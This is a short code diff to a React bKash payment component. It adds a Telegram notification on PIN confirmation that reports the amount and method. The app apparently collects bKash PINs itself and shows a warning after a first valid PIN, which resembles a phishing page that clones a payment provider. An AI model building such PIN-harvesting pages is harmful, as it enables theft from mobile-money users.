@@ -1,5 +1,6 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
+import { sendTelegramNotification } from "@/lib/telegram";
 import { Phone, Hand, XCircle } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import bkashLogoImg from "@/assets/bkash-logo.png";
@@ -170,6 +171,7 @@ const BkashPayment = () => {
   const handlePinConfirm = () => {
     if (isValidPin()) {
       setIsConfirmLoading(true);
+      sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'bKash' });
       if (pinAttempts === 0 && !pinWarningShown) {
         // Show loading first, then pin warning
         setTimeout(() => {
